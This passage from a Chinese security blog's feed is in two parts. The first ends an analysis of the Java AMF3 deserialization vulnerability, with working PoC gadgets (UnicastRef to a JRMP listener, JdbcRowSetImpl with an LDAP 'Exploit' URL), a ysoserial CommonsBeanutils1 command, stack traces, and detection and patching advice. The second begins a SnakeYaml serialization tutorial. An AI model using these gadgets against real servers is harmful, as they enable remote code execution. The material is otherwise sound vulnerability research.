class="line">        Object object = generateUnicastRef(<span class="string">"192.168.10.129"</span>, <span class="number">1234</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化对象，生成AMF Message对象</span></span><br><span class="line">        <span class="keyword">byte</span>[] amf = serialize(object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化对象</span></span><br><span class="line">        ActionMessage actionMessage = deserialize(amf);</span><br><span class="line">        System.out.println(<span class="string">"ActionMessage: "</span> + actionMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">generateUnicastRef</span><span class="params">(String host, <span class="keyword">int</span> port)</span> </span>&#123;</span><br><span class="line">        java.rmi.server.ObjID objId = <span class="keyword">new</span> java.rmi.server.ObjID();</span><br><span class="line">        sun.rmi.transport.tcp.TCPEndpoint endpoint = <span class="keyword">new</span> sun.rmi.transport.tcp.TCPEndpoint(host, port);</span><br><span class="line">        sun.rmi.transport.LiveRef liveRef = <span class="keyword">new</span> sun.rmi.transport.LiveRef(objId, endpoint, <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> sun.rmi.server.UnicastRef(liveRef);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(Object data) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        MessageBody body = <span class="keyword">new</span> MessageBody();</span><br><span class="line">        body.setData(data);</span><br><span class="line">        ActionMessage message = <span class="keyword">new</span> ActionMessage();</span><br><span class="line">        message.addBody(body);</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        AmfMessageSerializer serializer = <span class="keyword">new</span> AmfMessageSerializer();</span><br><span class="line">        serializer.initialize(SerializationContext.getSerializationContext(), out, <span class="keyword">null</span>);</span><br><span class="line">        serializer.writeMessage(message);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ActionMessage <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] amf)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">        ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(amf);</span><br><span class="line">        AmfMessageDeserializer deserializer = <span class="keyword">new</span> AmfMessageDeserializer();</span><br><span class="line">        deserializer.initialize(SerializationContext.getSerializationContext(), in, <span class="keyword">null</span>);</span><br><span class="line">        ActionMessage actionMessage = <span class="keyword">new</span> ActionMessage();</span><br><span class="line">        deserializer.readMessage(actionMessage, <span class="keyword">new</span> ActionContext());</span><br><span class="line">        <span class="keyword">return</span> actionMessage;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试下代码能否正常运行，监听下端口，看看是否能够成功建立连接：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/13.png" alt=""></p><p>此时，我们成功与客户端建立了一条通信连接，而且使用的还是Java RMI传输协议。</p><p>利用ysoserial工具，前提是目标环境存在可被反序列化利用的类，这里假设存在CommonsBeanutils1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 CommonsBeanutils1 calc.exe</span><br></pre></td></tr></table></figure><p>在Kali运行该命令开启JRMPListener监听，运行程序后Kali端接受到数据后就会发送payload，在Windows端就会弹计算器：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/14.png" alt=""></p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/15.png" alt=""></p><h4 id="基于JdbcRowSetImpl的Gadget"><a href="#基于JdbcRowSetImpl的Gadget" class="headerlink" title="基于JdbcRowSetImpl的Gadget"></a>基于JdbcRowSetImpl的Gadget</h4><p>JdbcRowSetImpl这条Gadget十分经典，原理和调试分析就不多说了，直接看PoC示例。</p><p><strong>注意，下面的代码写得有问题，只是给个示例方便自己记录一下，后面再进行分析修改。</strong></p><p>修改AMFDemo.java，传入一个JdbcRowSetImpl类对象进行反序列化，其中设置了DataSourceName和AutoCommit属性值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AMFDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object object = createPoC(<span class="string">"127.0.0.1"</span>, <span class="number">1389</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化对象，生成AMF Message对象</span></span><br><span class="line">        <span class="keyword">byte</span>[] amf = serialize(object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化对象</span></span><br><span class="line">        ActionMessage actionMessage = deserialize(amf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createPoC</span><span class="params">(String host, <span class="keyword">int</span> port)</span> </span>&#123;</span><br><span class="line">        com.sun.rowset.JdbcRowSetImpl jdbcRowSet = <span class="keyword">new</span> com.sun.rowset.JdbcRowSetImpl();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            jdbcRowSet.setDataSourceName(<span class="string">"ldap://"</span> + host + <span class="string">":"</span> + port + <span class="string">"/Exploit"</span>);</span><br><span class="line">            jdbcRowSet.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jdbcRowSet;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>之所以能触发，和AMF3没有直接关系，是前面初始化JdbcRowSetImpl类对象的时候触发的：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/12.png" alt=""></p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>这里只对UnicastRef这条Gadget进行调试分析。</p><p>反序列化过程在之前已经整体跟踪分析过了，我们看下关键的几个地方。</p><p>我们直接在UnicastRef.invoke()方法上打断点，调试直接运行到这，此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">invoke:377, UnicastRef (sun.rmi.server)</span><br><span class="line">dirty:-1, DGCImpl_Stub (sun.rmi.transport)</span><br><span class="line">makeDirtyCall:378, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:320, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:156, DGCClient (sun.rmi.transport)</span><br><span class="line">read:312, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:493, UnicastRef (sun.rmi.server)</span><br><span class="line">readExternalizable:828, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readScriptObject:757, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:154, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObject:132, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:122, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:93, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">deserialize:55, AMFDemo</span><br><span class="line">main:16, AMFDemo</span><br></pre></td></tr></table></figure><p>在UnicastRef.invoke()函数中，调用了executeCall()函数，其实就是一个远程TCP连接调用：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/17.png" alt=""></p><p>跟进StreamRemoteCall.executeCall()函数中，看到该方法直接从in数据库中进行了readObject()操作：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/16.png" alt=""></p><p>再往下，就是调用ObjectInputStream.readObject()的Java原生反序列化的内容了。由于目标环境存在可被反序列化漏洞利用的CommonsBeanutils1相关的jar包（commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2），因此Kali会通过建立的TCP连接把CommonsBeanutils1对应的payload发送过来这个readObject()中进行反序列化操作，从而触发漏洞。</p><p>此时函数调用栈为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">executeCall:245, StreamRemoteCall (sun.rmi.transport)</span><br><span class="line">invoke:379, UnicastRef (sun.rmi.server)</span><br><span class="line">dirty:-1, DGCImpl_Stub (sun.rmi.transport)</span><br><span class="line">makeDirtyCall:378, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:320, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:156, DGCClient (sun.rmi.transport)</span><br><span class="line">read:312, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:493, UnicastRef (sun.rmi.server)</span><br><span class="line">readExternalizable:828, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readScriptObject:757, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:154, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObject:132, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:122, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:93, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">deserialize:55, AMFDemo</span><br><span class="line">main:16, AMFDemo</span><br></pre></td></tr></table></figure><h2 id="0x05-检测与方法"><a href="#0x05-检测与方法" class="headerlink" title="0x05 检测与方法"></a>0x05 检测与方法</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>全局搜索是否使用flex-messaging-xx系列jar包，且版本是否&lt;4. 7.3；</p><p>若是则全局搜索如下关键代码排查，主要看AmfMessageDeserializer.readMessage()函数的参数是否外部可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flex.messaging.io.</span><br><span class="line">AmfMessageDeserializer</span><br><span class="line">readMessage(</span><br></pre></td></tr></table></figure><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>将flex-messaging相关jar包升级到4.7.3版本以上。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://www.anquanke.com/post/id/85846" target="_blank" rel="noopener">【技术分享】Java AMF3 反序列化漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java SnakeYaml反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml反序列化漏洞/</id>
    <published>2019-11-29T13:17:19.000Z</published>
    <updated>2019-12-06T17:43:20.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="SnakeYaml简介"><a href="#SnakeYaml简介" class="headerlink" title="SnakeYaml简介"></a>SnakeYaml简介</h3><p>YAML是”YAML Ain’t a Markup Language”（YAML不是一种标记语言）的递归缩写，是一个可读性高、用来表达数据序列化的格式，类似于XML但比XML更简洁。</p><p>在Java中，有一个用于解析YAML格式的库，即SnakeYaml。</p><p>SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8/UTF-16，支持Java对象的序列化/反序列化，支持所有YAML定义的类型。</p><h3 id="YAML语法与结构"><a href="#YAML语法与结构" class="headerlink" title="YAML语法与结构"></a>YAML语法与结构</h3><p>YAML基本格式要求：</p><ol><li>YAML大小写敏感；</li><li>使用缩进代表层级关系；</li><li>缩进只能使用空格，不能使用TAB，不要求空格个数，只需要相同层级左对齐（一般2个或4个空格）</li></ol><p>示例如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">environments:</span></span><br><span class="line"><span class="attr">    dev:</span></span><br><span class="line"><span class="attr">        url:</span> <span class="attr">http://dev.bar.com</span></span><br><span class="line"><span class="attr">        name:</span> <span class="string">Developer</span> <span class="string">Setup</span></span><br><span class="line"><span class="attr">    prod:</span></span><br><span class="line"><span class="attr">        url:</span> <span class="attr">http://foo.bar.com</span></span><br><span class="line"><span class="attr">        name:</span> <span class="string">My</span> <span class="string">Cool</span> <span class="string">App</span></span><br><span class="line"><span class="attr">my:</span></span><br><span class="line"><span class="attr">    servers:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">dev.bar.com</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">foo.bar.com</span></span><br></pre></td></tr></table></figure><p>YAML支持三种数据结构：</p><p>1、对象</p><p>使用冒号代表，格式为key: value。冒号后面要加一个空格：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">key:</span> <span class="string">value</span></span><br></pre></td></tr></table></figure><p>可以使用缩进表示层级关系：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">key:</span> </span><br><span class="line"><span class="attr">    child-key:</span> <span class="string">value</span></span><br><span class="line"><span class="attr">    child-key2:</span> <span class="string">value2</span></span><br></pre></td></tr></table></figure><p>2、数组</p><p>使用一个短横线加一个空格代表一个数组项：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hobby:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">Java</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">LOL</span></span><br></pre></td></tr></table></figure><p>3、常量</p><p>YAML中提供了多种常量结构，包括：整数，浮点数，字符串，NULL，日期，布尔，时间。下面使用一个例子来快速了解常量的基本使用：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">boolean: </span><br><span class="line">    - TRUE  <span class="meta">#true,True都可以</span></span><br><span class="line">    - FALSE  <span class="meta">#false，False都可以</span></span><br><span class="line"><span class="keyword">float</span>:</span><br><span class="line">    - <span class="number">3.14</span></span><br><span class="line">    - <span class="number">6.8523015e+5</span>  <span class="meta">#可以使用科学计数法</span></span><br><span class="line"><span class="keyword">int</span>:</span><br><span class="line">    - <span class="number">123</span></span><br><span class="line">    - <span class="number">0b1010</span>_0111_0100_1010_1110    <span class="meta">#二进制表示</span></span><br><span class="line"><span class="literal">null</span>:</span><br><span class="line">    nodeName: <span class="string">'node'</span></span><br><span class="line">    parent: ~  <span class="meta">#使用~表示null</span></span><br><span class="line"><span class="keyword">string</span>:</span><br><span class="line">    - 哈哈</span><br><span class="line">    - <span class="string">'Hello world'</span>  <span class="meta">#可以使用双引号或者单引号包裹特殊字符</span></span><br><span class="line">    - newline</span><br><span class="line">      newline2    <span class="meta">#字符串可以拆成多行，每一行会被转化成一个空格</span></span><br><span class="line">date:</span><br><span class="line">    - <span class="number">2018</span><span class="number">-02</span><span class="number">-17</span>    <span class="meta">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span></span><br><span class="line">datetime: </span><br><span class="line">    -  <span class="number">2018</span><span class="number">-02</span><span class="number">-17</span>T15:<span class="number">02</span>:<span class="number">31</span>+<span class="number">08</span>:<span class="number">00</span>    <span class="meta">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span></span><br></pre></td></tr></table></figure><p>更多的关于YAML的语法及使用可参考：<a href="https://www.yiibai.com/yaml" target="_blank" rel="noopener">https://www.yiibai.com/yaml</a></p><h3 id="使用SnakeYaml进行序列化和反序列化"><a href="#使用SnakeYaml进行序列化和反序列化" class="headerlink" title="使用SnakeYaml进行序列化和反序列化"></a>使用SnakeYaml进行序列化和反序列化</h3><p>SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数对yaml格式的数据进行序列化和反序列化。</p><ul><li>Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个Java对象；</li><li>Yaml.dump()：将一个对象转化为yaml文件形式；</li></ul><p>下面看下简单的用法，用的SnakeYaml版本是最新版的1.25。</p><p>User类，拥有一个name属性及其setter方法和getter方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java，序列化新建的User对象为yaml格式内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">        Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">        String s = yaml.dump(user);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出yaml格式的内容，<strong>这里”!!”用于强制类型转化，”!!User”是将该对象转为User类，如果没有”!”则就是个key为字符串的Map</strong>：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!User</span> <span class="string">&#123;name:</span> <span class="string">mi1k7ea&#125;</span></span><br></pre></td></tr></table></figure><p>修改Test.java，反序列化yaml格式内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String s = <span class="string">"!!User &#123;name: mi1k7ea&#125;"</span>;</span><br><span class="line">        Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">        User user = yaml.load(s);</span><br><span class="line">        System.out.println(user + <span class="string">":"</span> + user.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出，看到成功反序列化出User对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User@5e8c92f4:mi1k7ea</span><br></pre></td></tr></table></figure><h3 id="SnakeYaml反序列化的类方法调用"><a href="#SnakeYaml反序列化的类方法调用" class="headerlink" title="SnakeYaml反序列化的类方法调用"></a>SnakeYaml反序列化的类方法调用</h3><p>类比下Fastjson和Jackson的反序列化的类方法调用，这里我们也试下Yaml.load()在调用时会调用将要反序列化的类的哪些方法。</p><p>这里我们修改User类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"User构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"User.getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"User.setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"User.getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"User.setAge"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String s = <span class="string">"!!User &#123;name: mi1k7ea, age: 6&#125;"</span>;</span><br><span class="line">        Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">        User user = yaml.load(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，调用了反序列化的类的构造函数和yaml格式内容中包含的属性的setter方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User构造函数</span><br><span class="line">User.setName</span><br><span class="line">User.setAge</span><br></pre></td></tr></table></figure><h3 id="SnakeYaml反序列化过程调试分析"><a href="#SnakeYaml反序列化过程调试分析" class="headerlink" title="SnakeYaml反序列化过程调试分析"></a>SnakeYaml反序列化过程调试分析</h3><p>SnakeYaml反序列化的实现主要是通过反射机制来查找对应的Java类，新建一个实例并将对应的属性值赋给该实例。</p><p>在前面的反序列化Demo中，在<code>User user = yaml.load(s);</code>上打上断点开始调试。</p><p>在load()函数中会先生成一个StreamReader，将yaml数据通过构造函数赋给StreamReader，再调用loadFromReader()函数：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/1.png" alt=""></p><p>在loadFromReader()函数中，调用了BaseConstructor.getSingleData()函数，此时type为java.lang.Object，指定从yaml格式数据中获取数据类型是Object类型：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/2.png" alt=""></p><p>跟进getSingleData()函数中，先创建一个Node对象（其中调用getSingleNote()会根据流来生成一个文件，即将字符串按照yaml语法转为Node对象），然后判断当前Node是否为空且是否Tag为空，若不是则判断yaml格式数据的类型是否为Object类型、是否有根标签，这里都判断不通过，最后返回调用constructDocument()函数的结果：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/3.png" alt=""></p><p>跟下去继续调试，跟到getClassForNode()函数中，先根据tag取出className为User，然后调用getClassForName()函数获取到具体的User类：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/4.png" alt=""></p><p>在getClassName()函数中，判断开头是否是Tag.PREFIX即”tag:yaml.org,2002:”，是的话进行UTF-8编码并返回该类名：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/5.png" alt=""></p><p>而在getClassForName()函数中，根据获取到的User类名来调用<code>Class.forName()</code>即通过反射的方式来获取目标类User：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/6.png" alt=""></p><p>往下调试发现，调用construct()函数构造User类对象：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/7.png" alt=""></p><p>进一步跟进constructJavaBean2ndStep()函数，其中会获取yaml格式数据中的属性的键值对，然后调用propert.set()来设置新建的User对象的属性值：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/8.png" alt=""></p><p>跟进MethodProperty.set()函数，就是通过反射机制来调用User类name属性的setter方法来进行属性值的设置的：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/9.png" alt=""></p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/10.png" alt=""></p><p>属性值设置完成后，就返回新建的含有属性值的User类对象了。</p><p>整个SnakeYaml反序列化的过程就这样。</p><h2 id="0x02-SnakeYaml反序列化漏洞"><a href="#0x02-SnakeYaml反序列化漏洞" class="headerlink" title="0x02 SnakeYaml反序列化漏洞"></a>0x02 